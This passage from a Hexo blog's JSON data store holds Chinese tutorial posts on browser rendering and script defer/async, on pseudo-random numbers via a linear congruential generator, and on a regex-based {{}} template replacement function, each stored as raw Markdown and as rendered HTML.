渲染树(Render-Tree)的关键渲染路径中，要求同时具有 dom 和 cssom，之后才会构建渲染树。所以 html 和 css 都是被阻塞的资源。html 一定是需要的，那么可以从 css 上想办法。\n\n* 精简 css 并尽快提供它，例如将多个 css 合并成一个，并进行压缩\n\n### JavaScript\n\n* 实际工程，常常将 js 资源放到文档底部\n* defer 和 async 可以改变阻塞模式\n\n#### defer\n\n* defer 属性表示延迟执行引入的 js，这段 js 加载时候 html 也并未停止解析，这两个过程是并行的\n* 整个 document 解析完毕且 defer-script 也加载完成之后（这两件事情的顺序无关），会执行所有由 defer-script 加载的 JavaScript 代码，然后触发 DOMContentLoaded 事件。\n\n```javascript\n<script src=\"app1.js\" defer></script>\n<script src=\"app2.js\" defer></script>\n<script src=\"app3.js\" defer></script>\n```\n\n* defer 不会改变 script 中代码的执行顺序，示例代码会按照 1，2，3 的顺序执行。\n\n#### async\n\n```javascript\n<script src=\"app.js\" async></script>\n<script src=\"ad.js\" async></script>\n<script src=\"statistics.js\" async></script>\n```\n\n* async 属性表示异步执行引入的 JavaScript，与 defer 的区别在于，如果已经加载好，就会开始执行——无论此刻是 HTML 解析阶段还是 DOMContentLoaded 触发之后。需要注意的是，这种方式加载的 JavaScript 依然会阻塞 load 事件。换句话说，async-script 可能在 DOMContentLoaded 触发之前或之后执行，但一定在 load 触发之前执行。\n* 多个 async-script 的执行顺序是不确定的。所以 app.js 和 ad.js 和 statistics.js 不一定是顺序执行，谁先加载完谁先执行。\n","source":"_posts/study-render.md","raw":"---\ntitle: 浅谈浏览器渲染\ndate: 2018-01-10 10:26:50\ntags: 浏览器\n---\n\n* 作为一个前端工程师，了解浏览器的渲染过程，可以掌握优化的指导原则。\n* 现在有那么多的优化方案，预编译，预加载，资源合并，按需加载等等都是针对浏览器渲染的优化。\n\n### 关键渲染路径\n\n* 关键渲染路径(Critical Rendering Path)是指与当前用户操作有关的内容\n* 比如用户刚刚打开一个页面，首屏的显示就是当前用户操作的内容，具体就是浏览器收到 html/css/js 等资源并对其进行处理从而渲染出页面\n* 了解浏览器渲染的过程与原理，很大程度上是为了优化关键渲染路径\n* 为了保障首屏内容的最快速显示，通常会提到渐进式页面渲染，但是为了渐进式页面渲染，就要做资源的拆分，怎么拆分，这是按场景考虑的\n\n## 浏览器渲染页面过程\n\n* 1.dns 查询\n* 2.tcp 连接\n* 3.http 请求即响应\n* 4.服务端响应\n* 5.客户端渲染\n\n### 客户端渲染\n\n> 以下步骤不一定一次性顺序完成，如果 dom 或者 cssom 被修改，则以下过程需要重复执行，这样才能计算哪些像素在屏幕上需要重新渲染\n\n* 1.处理 html 标记并构建 dom 树\n* 2.处理 css 并构建 cssom 树\n* 3.将 dom 树和 cssom 树合并成一个渲染树\n* 4.根据渲染树来布局，以计算每个节点的几何信息\n* 5.将各个节点绘制到屏幕上\n\n## 阻塞渲染\n\n> 现代浏览器是并行加载资源的。当 HTML 解析器(html parser)被脚本阻塞的时候，解析器虽然会停止构建 dom，但仍然会识别该脚本后面的资源，并进行预加载。\n\n* 默认情况下，css 被视为阻塞渲染的资源，这意味着浏览器将不会渲染任何已处理的内容，直到 cssdom 构建完毕\n* js 不仅可以读取和修改 dom 属性，还可以读取和修改 cssom 属性\n\n> 存在阻塞的 css 资源的时候，浏览器就会延迟 js 的执行和 dom 构建\n\n* 当浏览器遇到一个 script 标记的时候，dom 构建将暂停，直到脚本完成执行\n* cssom 构建的时候，js 执行将暂停，直到 cssdom 就绪\n\n> 所以 script 标签的位置很重要，实际使用的时候，可以遵循下面两个原则\n\n* css 优先：引入顺序上，css 资源先于 js 资源\n* js 应该尽量少影响 dom 的构建\n\n### CSS\n\n> 渲染树(Render-Tree)的关键渲染路径中，要求同时具有 dom 和 cssom，之后才会构建渲染树。所以 html 和 css 都是被阻塞的资源。html 一定是需要的，那么可以从 css 上想办法。\n\n* 精简 css 并尽快提供它，例如将多个 css 合并成一个，并进行压缩\n\n### JavaScript\n\n* 实际工程，常常将 js 资源放到文档底部\n* defer 和 async 可以改变阻塞模式\n\n#### defer\n\n* defer 属性表示延迟执行引入的 js，这段 js 加载时候 html 也并未停止解析，这两个过程是并行的\n* 整个 document 解析完毕且 defer-script 也加载完成之后（这两件事情的顺序无关），会执行所有由 defer-script 加载的 JavaScript 代码，然后触发 DOMContentLoaded 事件。\n\n```javascript\n<script src=\"app1.js\" defer></script>\n<script src=\"app2.js\" defer></script>\n<script src=\"app3.js\" defer></script>\n```\n\n* defer 不会改变 script 中代码的执行顺序，示例代码会按照 1，2，3 的顺序执行。\n\n#### async\n\n```javascript\n<script src=\"app.js\" async></script>\n<script src=\"ad.js\" async></script>\n<script src=\"statistics.js\" async></script>\n```\n\n* async 属性表示异步执行引入的 JavaScript，与 defer 的区别在于，如果已经加载好，就会开始执行——无论此刻是 HTML 解析阶段还是 DOMContentLoaded 触发之后。需要注意的是，这种方式加载的 JavaScript 依然会阻塞 load 事件。换句话说，async-script 可能在 DOMContentLoaded 触发之前或之后执行，但一定在 load 触发之前执行。\n* 多个 async-script 的执行顺序是不确定的。所以 app.js 和 ad.js 和 statistics.js 不一定是顺序执行，谁先加载完谁先执行。\n","slug":"study-render","published":1,"updated":"2018-04-17T14:02:08.996Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rx003t0iof898kjhm2","content":"<ul>\n<li>作为一个前端工程师，了解浏览器的渲染过程，可以掌握优化的指导原则。</li>\n<li>现在有那么多的优化方案，预编译，预加载，资源合并，按需加载等等都是针对浏览器渲染的优化。</li>\n</ul>\n<h3 id=\"关键渲染路径\"><a href=\"#关键渲染路径\" class=\"headerlink\" title=\"关键渲染路径\"></a>关键渲染路径</h3><ul>\n<li>关键渲染路径(Critical Rendering Path)是指与当前用户操作有关的内容</li>\n<li>比如用户刚刚打开一个页面，首屏的显示就是当前用户操作的内容，具体就是浏览器收到 html/css/js 等资源并对其进行处理从而渲染出页面</li>\n<li>了解浏览器渲染的过程与原理，很大程度上是为了优化关键渲染路径</li>\n<li>为了保障首屏内容的最快速显示，通常会提到渐进式页面渲染，但是为了渐进式页面渲染，就要做资源的拆分，怎么拆分，这是按场景考虑的</li>\n</ul>\n<h2 id=\"浏览器渲染页面过程\"><a href=\"#浏览器渲染页面过程\" class=\"headerlink\" title=\"浏览器渲染页面过程\"></a>浏览器渲染页面过程</h2><ul>\n<li>1.dns 查询</li>\n<li>2.tcp 连接</li>\n<li>3.http 请求即响应</li>\n<li>4.服务端响应</li>\n<li>5.客户端渲染</li>\n</ul>\n<h3 id=\"客户端渲染\"><a href=\"#客户端渲染\" class=\"headerlink\" title=\"客户端渲染\"></a>客户端渲染</h3><blockquote>\n<p>以下步骤不一定一次性顺序完成，如果 dom 或者 cssom 被修改，则以下过程需要重复执行，这样才能计算哪些像素在屏幕上需要重新渲染</p>\n</blockquote>\n<ul>\n<li>1.处理 html 标记并构建 dom 树</li>\n<li>2.处理 css 并构建 cssom 树</li>\n<li>3.将 dom 树和 cssom 树合并成一个渲染树</li>\n<li>4.根据渲染树来布局，以计算每个节点的几何信息</li>\n<li>5.将各个节点绘制到屏幕上</li>\n</ul>\n<h2 id=\"阻塞渲染\"><a href=\"#阻塞渲染\" class=\"headerlink\" title=\"阻塞渲染\"></a>阻塞渲染</h2><blockquote>\n<p>现代浏览器是并行加载资源的。当 HTML 解析器(html parser)被脚本阻塞的时候，解析器虽然会停止构建 dom，但仍然会识别该脚本后面的资源，并进行预加载。</p>\n</blockquote>\n<ul>\n<li>默认情况下，css 被视为阻塞渲染的资源，这意味着浏览器将不会渲染任何已处理的内容，直到 cssdom 构建完毕</li>\n<li>js 不仅可以读取和修改 dom 属性，还可以读取和修改 cssom 属性</li>\n</ul>\n<blockquote>\n<p>存在阻塞的 css 资源的时候，浏览器就会延迟 js 的执行和 dom 构建</p>\n</blockquote>\n<ul>\n<li>当浏览器遇到一个 script 标记的时候，dom 构建将暂停，直到脚本完成执行</li>\n<li>cssom 构建的时候，js 执行将暂停，直到 cssdom 就绪</li>\n</ul>\n<blockquote>\n<p>所以 script 标签的位置很重要，实际使用的时候，可以遵循下面两个原则</p>\n</blockquote>\n<ul>\n<li>css 优先：引入顺序上，css 资源先于 js 资源</li>\n<li>js 应该尽量少影响 dom 的构建</li>\n</ul>\n<h3 id=\"CSS\"><a href=\"#CSS\" class=\"headerlink\" title=\"CSS\"></a>CSS</h3><blockquote>\n<p>渲染树(Render-Tree)的关键渲染路径中，要求同时具有 dom 和 cssom，之后才会构建渲染树。所以 html 和 css 都是被阻塞的资源。html 一定是需要的，那么可以从 css 上想办法。</p>\n</blockquote>\n<ul>\n<li>精简 css 并尽快提供它，例如将多个 css 合并成一个，并进行压缩</li>\n</ul>\n<h3 id=\"JavaScript\"><a href=\"#JavaScript\" class=\"headerlink\" title=\"JavaScript\"></a>JavaScript</h3><ul>\n<li>实际工程，常常将 js 资源放到文档底部</li>\n<li>defer 和 async 可以改变阻塞模式</li>\n</ul>\n<h4 id=\"defer\"><a href=\"#defer\" class=\"headerlink\" title=\"defer\"></a>defer</h4><ul>\n<li>defer 属性表示延迟执行引入的 js，这段 js 加载时候 html 也并未停止解析，这两个过程是并行的</li>\n<li>整个 document 解析完毕且 defer-script 也加载完成之后（这两件事情的顺序无关），会执行所有由 defer-script 加载的 JavaScript 代码，然后触发 DOMContentLoaded 事件。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=<span class=\"string\">\"app1.js\"</span> defer&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"app2.js\"</span> defer&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"app3.js\"</span> defer&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>defer 不会改变 script 中代码的执行顺序，示例代码会按照 1，2，3 的顺序执行。</li>\n</ul>\n<h4 id=\"async\"><a href=\"#async\" class=\"headerlink\" title=\"async\"></a>async</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=<span class=\"string\">\"app.js\"</span> <span class=\"keyword\">async</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"ad.js\"</span> <span class=\"keyword\">async</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"statistics.js\"</span> <span class=\"keyword\">async</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>async 属性表示异步执行引入的 JavaScript，与 defer 的区别在于，如果已经加载好，就会开始执行——无论此刻是 HTML 解析阶段还是 DOMContentLoaded 触发之后。需要注意的是，这种方式加载的 JavaScript 依然会阻塞 load 事件。换句话说，async-script 可能在 DOMContentLoaded 触发之前或之后执行，但一定在 load 触发之前执行。</li>\n<li>多个 async-script 的执行顺序是不确定的。所以 app.js 和 ad.js 和 statistics.js 不一定是顺序执行，谁先加载完谁先执行。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>作为一个前端工程师，了解浏览器的渲染过程，可以掌握优化的指导原则。</li>\n<li>现在有那么多的优化方案，预编译，预加载，资源合并，按需加载等等都是针对浏览器渲染的优化。</li>\n</ul>\n<h3 id=\"关键渲染路径\"><a href=\"#关键渲染路径\" class=\"headerlink\" title=\"关键渲染路径\"></a>关键渲染路径</h3><ul>\n<li>关键渲染路径(Critical Rendering Path)是指与当前用户操作有关的内容</li>\n<li>比如用户刚刚打开一个页面，首屏的显示就是当前用户操作的内容，具体就是浏览器收到 html/css/js 等资源并对其进行处理从而渲染出页面</li>\n<li>了解浏览器渲染的过程与原理，很大程度上是为了优化关键渲染路径</li>\n<li>为了保障首屏内容的最快速显示，通常会提到渐进式页面渲染，但是为了渐进式页面渲染，就要做资源的拆分，怎么拆分，这是按场景考虑的</li>\n</ul>\n<h2 id=\"浏览器渲染页面过程\"><a href=\"#浏览器渲染页面过程\" class=\"headerlink\" title=\"浏览器渲染页面过程\"></a>浏览器渲染页面过程</h2><ul>\n<li>1.dns 查询</li>\n<li>2.tcp 连接</li>\n<li>3.http 请求即响应</li>\n<li>4.服务端响应</li>\n<li>5.客户端渲染</li>\n</ul>\n<h3 id=\"客户端渲染\"><a href=\"#客户端渲染\" class=\"headerlink\" title=\"客户端渲染\"></a>客户端渲染</h3><blockquote>\n<p>以下步骤不一定一次性顺序完成，如果 dom 或者 cssom 被修改，则以下过程需要重复执行，这样才能计算哪些像素在屏幕上需要重新渲染</p>\n</blockquote>\n<ul>\n<li>1.处理 html 标记并构建 dom 树</li>\n<li>2.处理 css 并构建 cssom 树</li>\n<li>3.将 dom 树和 cssom 树合并成一个渲染树</li>\n<li>4.根据渲染树来布局，以计算每个节点的几何信息</li>\n<li>5.将各个节点绘制到屏幕上</li>\n</ul>\n<h2 id=\"阻塞渲染\"><a href=\"#阻塞渲染\" class=\"headerlink\" title=\"阻塞渲染\"></a>阻塞渲染</h2><blockquote>\n<p>现代浏览器是并行加载资源的。当 HTML 解析器(html parser)被脚本阻塞的时候，解析器虽然会停止构建 dom，但仍然会识别该脚本后面的资源，并进行预加载。</p>\n</blockquote>\n<ul>\n<li>默认情况下，css 被视为阻塞渲染的资源，这意味着浏览器将不会渲染任何已处理的内容，直到 cssdom 构建完毕</li>\n<li>js 不仅可以读取和修改 dom 属性，还可以读取和修改 cssom 属性</li>\n</ul>\n<blockquote>\n<p>存在阻塞的 css 资源的时候，浏览器就会延迟 js 的执行和 dom 构建</p>\n</blockquote>\n<ul>\n<li>当浏览器遇到一个 script 标记的时候，dom 构建将暂停，直到脚本完成执行</li>\n<li>cssom 构建的时候，js 执行将暂停，直到 cssdom 就绪</li>\n</ul>\n<blockquote>\n<p>所以 script 标签的位置很重要，实际使用的时候，可以遵循下面两个原则</p>\n</blockquote>\n<ul>\n<li>css 优先：引入顺序上，css 资源先于 js 资源</li>\n<li>js 应该尽量少影响 dom 的构建</li>\n</ul>\n<h3 id=\"CSS\"><a href=\"#CSS\" class=\"headerlink\" title=\"CSS\"></a>CSS</h3><blockquote>\n<p>渲染树(Render-Tree)的关键渲染路径中，要求同时具有 dom 和 cssom，之后才会构建渲染树。所以 html 和 css 都是被阻塞的资源。html 一定是需要的，那么可以从 css 上想办法。</p>\n</blockquote>\n<ul>\n<li>精简 css 并尽快提供它，例如将多个 css 合并成一个，并进行压缩</li>\n</ul>\n<h3 id=\"JavaScript\"><a href=\"#JavaScript\" class=\"headerlink\" title=\"JavaScript\"></a>JavaScript</h3><ul>\n<li>实际工程，常常将 js 资源放到文档底部</li>\n<li>defer 和 async 可以改变阻塞模式</li>\n</ul>\n<h4 id=\"defer\"><a href=\"#defer\" class=\"headerlink\" title=\"defer\"></a>defer</h4><ul>\n<li>defer 属性表示延迟执行引入的 js，这段 js 加载时候 html 也并未停止解析，这两个过程是并行的</li>\n<li>整个 document 解析完毕且 defer-script 也加载完成之后（这两件事情的顺序无关），会执行所有由 defer-script 加载的 JavaScript 代码，然后触发 DOMContentLoaded 事件。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=<span class=\"string\">\"app1.js\"</span> defer&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"app2.js\"</span> defer&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"app3.js\"</span> defer&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>defer 不会改变 script 中代码的执行顺序，示例代码会按照 1，2，3 的顺序执行。</li>\n</ul>\n<h4 id=\"async\"><a href=\"#async\" class=\"headerlink\" title=\"async\"></a>async</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=<span class=\"string\">\"app.js\"</span> <span class=\"keyword\">async</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"ad.js\"</span> <span class=\"keyword\">async</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"statistics.js\"</span> <span class=\"keyword\">async</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>async 属性表示异步执行引入的 JavaScript，与 defer 的区别在于，如果已经加载好，就会开始执行——无论此刻是 HTML 解析阶段还是 DOMContentLoaded 触发之后。需要注意的是，这种方式加载的 JavaScript 依然会阻塞 load 事件。换句话说，async-script 可能在 DOMContentLoaded 触发之前或之后执行，但一定在 load 触发之前执行。</li>\n<li>多个 async-script 的执行顺序是不确定的。所以 app.js 和 ad.js 和 statistics.js 不一定是顺序执行，谁先加载完谁先执行。</li>\n</ul>\n"},{"title":"计算机的随机数是伪随机","date":"2018-06-23T12:36:57.000Z","_content":"\n## 计算机中的随机数\n\n- 我们平时通过摇骰子来扔出点数\n- 这个事情是随机的（不考虑作弊）\n- 但是作为计算机的大脑，cpu 可不会摇骰子\n- 所以它只能通过公式算出来，而且是根据随时在变的时间\n- 具有周期性\n- 有很多种公式，这里介绍一下线性同余法\n\n#### 线性同余法\n\n- 计算公式是(a+b\\*r)%c，就是取余数\n\n* a,b,c 都是系数（也称为随机数的种子），r 是上次算出来的随机数\n* 我们先把 r 设为 0，a,b,c 分别为 1，2，3\n\n| 1   |  2  |   3 |  4  |   5 |  6  |   7 |  8  |   9 | 10  |  11 |  12 |\n| --- | :-: | --: | :-: | --: | :-: | --: | :-: | --: | :-: | --: | --: |\n| 0   |  3  |   2 |  5  |   4 |  7  |   6 |  1  |   0 |  3  |   2 |   5 |\n\n- 容易看出，产生 8 次随机数后，下次产生的也就相同了，这就是所谓周期性\n- 所以要看起来更随机的话，随机数的种子要根据时间来变化\n","source":"_posts/study-random-num.md","raw":"---\ntitle: 计算机的随机数是伪随机\ndate: 2018-06-23 20:36:57\ntags: 计算机基础\n---\n\n## 计算机中的随机数\n\n- 我们平时通过摇骰子来扔出点数\n- 这个事情是随机的（不考虑作弊）\n- 但是作为计算机的大脑，cpu 可不会摇骰子\n- 所以它只能通过公式算出来，而且是根据随时在变的时间\n- 具有周期性\n- 有很多种公式，这里介绍一下线性同余法\n\n#### 线性同余法\n\n- 计算公式是(a+b\\*r)%c，就是取余数\n\n* a,b,c 都是系数（也称为随机数的种子），r 是上次算出来的随机数\n* 我们先把 r 设为 0，a,b,c 分别为 1，2，3\n\n| 1   |  2  |   3 |  4  |   5 |  6  |   7 |  8  |   9 | 10  |  11 |  12 |\n| --- | :-: | --: | :-: | --: | :-: | --: | :-: | --: | :-: | --: | --: |\n| 0   |  3  |   2 |  5  |   4 |  7  |   6 |  1  |   0 |  3  |   2 |   5 |\n\n- 容易看出，产生 8 次随机数后，下次产生的也就相同了，这就是所谓周期性\n- 所以要看起来更随机的话，随机数的种子要根据时间来变化\n","slug":"study-random-num","published":1,"updated":"2018-06-25T05:47:07.626Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034ry003v0iof2uok3n9o","content":"<h2 id=\"计算机中的随机数\"><a href=\"#计算机中的随机数\" class=\"headerlink\" title=\"计算机中的随机数\"></a>计算机中的随机数</h2><ul>\n<li>我们平时通过摇骰子来扔出点数</li>\n<li>这个事情是随机的（不考虑作弊）</li>\n<li>但是作为计算机的大脑，cpu 可不会摇骰子</li>\n<li>所以它只能通过公式算出来，而且是根据随时在变的时间</li>\n<li>具有周期性</li>\n<li>有很多种公式，这里介绍一下线性同余法</li>\n</ul>\n<h4 id=\"线性同余法\"><a href=\"#线性同余法\" class=\"headerlink\" title=\"线性同余法\"></a>线性同余法</h4><ul>\n<li>计算公式是(a+b*r)%c，就是取余数</li>\n</ul>\n<ul>\n<li>a,b,c 都是系数（也称为随机数的种子），r 是上次算出来的随机数</li>\n<li>我们先把 r 设为 0，a,b,c 分别为 1，2，3</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>1</th>\n<th style=\"text-align:center\">2</th>\n<th style=\"text-align:right\">3</th>\n<th style=\"text-align:center\">4</th>\n<th style=\"text-align:right\">5</th>\n<th style=\"text-align:center\">6</th>\n<th style=\"text-align:right\">7</th>\n<th style=\"text-align:center\">8</th>\n<th style=\"text-align:right\">9</th>\n<th style=\"text-align:center\">10</th>\n<th style=\"text-align:right\">11</th>\n<th style=\"text-align:right\">12</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:right\">2</td>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:right\">4</td>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:right\">6</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:right\">0</td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:right\">2</td>\n<td style=\"text-align:right\">5</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>容易看出，产生 8 次随机数后，下次产生的也就相同了，这就是所谓周期性</li>\n<li>所以要看起来更随机的话，随机数的种子要根据时间来变化</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"计算机中的随机数\"><a href=\"#计算机中的随机数\" class=\"headerlink\" title=\"计算机中的随机数\"></a>计算机中的随机数</h2><ul>\n<li>我们平时通过摇骰子来扔出点数</li>\n<li>这个事情是随机的（不考虑作弊）</li>\n<li>但是作为计算机的大脑，cpu 可不会摇骰子</li>\n<li>所以它只能通过公式算出来，而且是根据随时在变的时间</li>\n<li>具有周期性</li>\n<li>有很多种公式，这里介绍一下线性同余法</li>\n</ul>\n<h4 id=\"线性同余法\"><a href=\"#线性同余法\" class=\"headerlink\" title=\"线性同余法\"></a>线性同余法</h4><ul>\n<li>计算公式是(a+b*r)%c，就是取余数</li>\n</ul>\n<ul>\n<li>a,b,c 都是系数（也称为随机数的种子），r 是上次算出来的随机数</li>\n<li>我们先把 r 设为 0，a,b,c 分别为 1，2，3</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>1</th>\n<th style=\"text-align:center\">2</th>\n<th style=\"text-align:right\">3</th>\n<th style=\"text-align:center\">4</th>\n<th style=\"text-align:right\">5</th>\n<th style=\"text-align:center\">6</th>\n<th style=\"text-align:right\">7</th>\n<th style=\"text-align:center\">8</th>\n<th style=\"text-align:right\">9</th>\n<th style=\"text-align:center\">10</th>\n<th style=\"text-align:right\">11</th>\n<th style=\"text-align:right\">12</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:right\">2</td>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:right\">4</td>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:right\">6</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:right\">0</td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:right\">2</td>\n<td style=\"text-align:right\">5</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>容易看出，产生 8 次随机数后，下次产生的也就相同了，这就是所谓周期性</li>\n<li>所以要看起来更随机的话，随机数的种子要根据时间来变化</li>\n</ul>\n"},{"title":"模板字符串的替换","date":"2017-05-11T03:04:02.000Z","_content":"\n## 简单介绍\n\n> 看到 vue 模板里都是用{{内容}}包含变量，然后替换成变量，觉得比字符串拼接实在是好太多了\n\n* es6 的字符串模板用起来实在是舒服，所以简单用{{内容}}实现一下\n\n```javascript\n// 首先 str.replace(regexp|substr, newSubStr|function) ，replace 可以传递一个函数\nstr.replace(reg,function(match,key)=>{})\n//正则匹配{{内容}}，应该是/\\{\\{(.*?)\\}\\}/，用\\转义{和}\n// /\\{\\{(.*?)\\}\\}/g;\n```\n\n## 正则表达\n\n* **.\\*?**是正则的固定搭配用法，就是表示非贪婪模式，尽可能匹配少的意思\n* **.\\***则表示贪婪模式\n\n```javascript\n源字符串：aa<div>test1</div>bb<div>test2</div>cc\n\n正则表达式一：<div>.*</div>\n\n匹配结果一：<div>test1</div>bb<div>test2</div>(从头部匹配到尾部，从第一个div到最后的那个</div>)\n\n正则表达式二：<div>.*?</div>\n\n匹配结果二：<div>test1</div>（这里指的是一次匹配结果，不使用\\/g，所以没包括<div>test2</div>）\n```\n\n## 简单实现\n\n* 所以有上面的简单铺垫，可以简单写出\n\n```javascript\nfunction render(template, context) {\n  return template.replace(/\\{\\{(.*?)\\}\\}/g, (match, key) => {\n    console.log(match, key); //match是{{name }}，key是name\n    return context[key.trim()];\n  });\n}\n//可以使用trim去掉前后空格\nconst template = \"我是{{name   }}，现在{{age   }}岁\";\nconst context = { name: \"yoki\", age: \"20\" };\nconsole.log(render(template, context));\n```\n","source":"_posts/study-replace-template.md","raw":"---\ntitle: 模板字符串的替换\ndate: 2017-05-11 11:04:02\ntags: javascript\n---\n\n## 简单介绍\n\n> 看到 vue 模板里都是用{{内容}}包含变量，然后替换成变量，觉得比字符串拼接实在是好太多了\n\n* es6 的字符串模板用起来实在是舒服，所以简单用{{内容}}实现一下\n\n```javascript\n// 首先 str.replace(regexp|substr, newSubStr|function) ，replace 可以传递一个函数\nstr.replace(reg,function(match,key)=>{})\n//正则匹配{{内容}}，应该是/\\{\\{(.*?)\\}\\}/，用\\转义{和}\n// /\\{\\{(.*?)\\}\\}/g;\n```\n\n## 正则表达\n\n* **.\\*?**是正则的固定搭配用法，就是表示非贪婪模式，尽可能匹配少的意思\n* **.\\***则表示贪婪模式\n\n```javascript\n源字符串：aa<div>test1</div>bb<div>test2</div>cc\n\n正则表达式一：<div>.*</div>\n\n匹配结果一：<div>test1</div>bb<div>test2</div>(从头部匹配到尾部，从第一个div到最后的那个</div>)\n\n正则表达式二：<div>.*?</div>\n\n匹配结果二：<div>test1</div>（这里指的是一次匹配结果，不使用\\/g，所以没包括<div>test2</div>）\n```\n\n## 简单实现\n\n* 所以有上面的简单铺垫，可以简单写出\n\n```javascript\nfunction render(template, context) {\n  return template.replace(/\\{\\{(.*?)\\}\\}/g, (match, key) => {\n    console.log(match, key); //match是{{name }}，key是name\n    return context[key.trim()];\n  });\n}\n//可以使用trim去掉前后空格\nconst template = \"我是{{name   }}，现在{{age   }}岁\";\nconst context = { name: \"yoki\", age: \"20\" };\nconsole.log(render(template, context));\n```\n","slug":"study-replace-template","published":1,"updated":"2018-04-12T03:28:50.803Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rz003x0iofej5e3o7o","content":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><blockquote>\n<p>看到 vue 模板里都是用包含变量，然后替换成变量，觉得比字符串拼接实在是好太多了</p>\n</blockquote>\n<ul>\n<li>es6 的字符串模板用起来实在是舒服，所以简单用实现一下</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 首先 str.replace(regexp|substr, newSubStr|function) ，replace 可以传递一个函数</span></span><br><span class=\"line\">str.replace(reg,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">match,key</span>)=&gt;</span>&#123;&#125;)</span><br><span class=\"line\"><span class=\"comment\">//正则匹配&#123;&#123;内容&#125;&#125;，应该是/\\&#123;\\&#123;(.*?)\\&#125;\\&#125;/，用\\转义&#123;和&#125;</span></span><br><span class=\"line\"><span class=\"comment\">// /\\&#123;\\&#123;(.*?)\\&#125;\\&#125;/g;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"正则表达\"><a href=\"#正则表达\" class=\"headerlink\" title=\"正则表达\"></a>正则表达</h2><ul>\n<li><strong>.*?</strong>是正则的固定搭配用法，就是表示非贪婪模式，尽可能匹配少的意思</li>\n<li><strong>.*</strong>则表示贪婪模式</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">源字符串：aa&lt;div&gt;test1&lt;<span class=\"regexp\">/div&gt;bb&lt;div&gt;test2&lt;/</span>div&gt;cc</span><br><span class=\"line\"></span><br><span class=\"line\">正则表达式一：&lt;div&gt;.*&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">匹配结果一：&lt;div&gt;test1&lt;<span class=\"regexp\">/div&gt;bb&lt;div&gt;test2&lt;/</span>div&gt;(从头部匹配到尾部，从第一个div到最后的那个&lt;<span class=\"regexp\">/div&gt;)</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">正则表达式二：&lt;div&gt;.*?&lt;/</span>div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">匹配结果二：&lt;div&gt;test1&lt;<span class=\"regexp\">/div&gt;（这里指的是一次匹配结果，不使用\\/g，所以没包括&lt;div&gt;test2&lt;/</span>div&gt;）</span><br></pre></td></tr></table></figure>\n<h2 id=\"简单实现\"><a href=\"#简单实现\" class=\"headerlink\" 